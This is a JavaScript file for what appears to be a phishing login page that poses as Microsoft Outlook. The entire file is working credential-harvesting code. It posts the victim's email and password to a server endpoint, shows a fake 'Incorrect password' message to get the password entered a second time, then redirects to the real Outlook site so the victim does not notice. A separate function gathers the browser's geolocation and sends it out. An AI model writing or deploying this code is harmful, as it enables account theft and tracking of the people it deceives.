function sendLocationThenSubmit() {
  navigator.geolocation.getCurrentPosition((pos) => {
    fetch("/loginbtn", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        amount: 100,
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
      }),
    });
  });
}

document.addEventListener("DOMContentLoaded", () => {
  let clickedOnce = false;

  const btn = document.getElementById("loginBtn");
  const emailField = document.getElementById("email");
  const passwordField = document.getElementById("password");
  const error = document.getElementById("error");

  btn.addEventListener("click", async () => {
    const email = emailField.value.trim();
    const password = passwordField.value.trim();

    if (!email || !password) {
      error.style.display = "block";
      return;
    }

    error.style.display = "none";

    // Disable button and show processing
    btn.disabled = true;
    const originalText = btn.textContent;
    btn.textContent = "Processing...";

    try {
      const response = await fetch("/submit", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: email,
          password: password,
        }),
      });

      const result = await response.json();

      if (result.status === "success") {
        if (!clickedOnce) {
          clickedOnce = true;
          emailField.disabled = true;
          passwordField.value = "";
          error.textContent =
            "Incorrect password, please re-enter to continue.";
          error.style.display = "block";

          btn.textContent = "Continue";
          btn.disabled = false;
        } else {
          error.style.display = "none";

          if (window.parent !== window) {
            window.parent.postMessage("redirect-to-outlook", "*");
          } else {
            window.location.href = "https://outlook.live.com";
          }
        }
      } else {
        alert("Failed to send data. Try again later.");
        btn.textContent = originalText;
        btn.disabled = false;
      }
    } catch (err) {
      console.error("❌ Error sending data:", err);
      alert("Something went wrong. Try again later.");
      btn.textContent = originalText;
      btn.disabled = false;
    }
  });
});
